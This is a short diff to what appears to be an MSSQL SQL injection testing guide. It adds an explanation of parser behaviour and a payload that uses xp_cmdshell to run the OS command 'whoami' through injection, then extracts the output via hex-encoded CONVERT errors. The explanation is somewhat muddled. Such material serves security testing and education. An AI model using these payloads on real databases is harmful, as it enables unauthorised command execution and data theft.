@@ -259,6 +259,24 @@ SELECT CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), (SELECT DB_NAME())), 2);
 SELECT CONVERT(INT, CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), (SELECT DB_NAME())), 2));
 ```
 
+The parser expects something like:
+```sql
+CONVERT(VARBINARY(MAX), expression)
+```
+After the comma it expects:
+
+'Kaif'
+column_name
+@variable
+GETDATE()
+
+Instead it sees: EXEC
+which starts a new statement, so the parser stops and reports:
+
+```sql
+CREATE TABLE Output (result VARCHAR(255)) INSERT INTO Output EXEC xp_cmdshell 'whoami'  SELECT Convert(VARCHAR(MAX),CONVERT(VARBINARY(MAX),result), 2) FROM Output;
+```
+
 ---
 
 ## 12. Additional Techniques Worth Testing
